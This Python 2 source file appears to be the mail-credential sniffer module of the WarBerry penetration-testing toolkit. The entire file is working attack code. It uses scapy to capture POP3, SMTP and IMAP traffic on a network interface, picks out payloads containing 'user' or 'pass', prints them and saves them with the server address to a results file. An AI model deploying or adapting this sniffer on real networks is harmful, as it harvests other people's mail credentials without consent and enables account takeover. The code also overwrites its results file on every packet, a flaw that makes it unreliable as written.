from scapy.all import *
from src.utils.console_colors import *


def packet_callback(packet):
    if os.path.isfile('../Results/mailcreds'):
        print bcolors.WARNING + "[!] Mail Creds Results File Exists. Previous Results will be overwritten\n " + bcolors.ENDC
    with open('../Results/mailcreds', 'w') as mailcreds:
        if packet[TCP].payload:
            mail_packet = str(packet[TCP].payload)
            if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
                print "[*] Server: %s" % packet[IP].dst
                print "[*] %s" % packet[TCP].payload
                mailcreds.write(packet[IP].dst + " " + packet[TCP].payload)


def mail_creds(iface, expire):
    print " "
    print bcolors.OKGREEN + "      [ MAIL INFO SNIFFER MODULE ]\n" + bcolors.ENDC
    print '[*] Sniffing for %d seconds...' %expire
    print "Interface: %s" %iface
    sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", iface=iface, prn=packet_callback, store=0, timeout=expire)
    print bcolors.OKGREEN + "[+] " + bcolors.ENDC + "Capture Completed." + bcolors.ENDC + " Results saved at " + bcolors.OKGREEN + "../WarBerry/Results/mailcreds!\n" + bcolors.ENDC
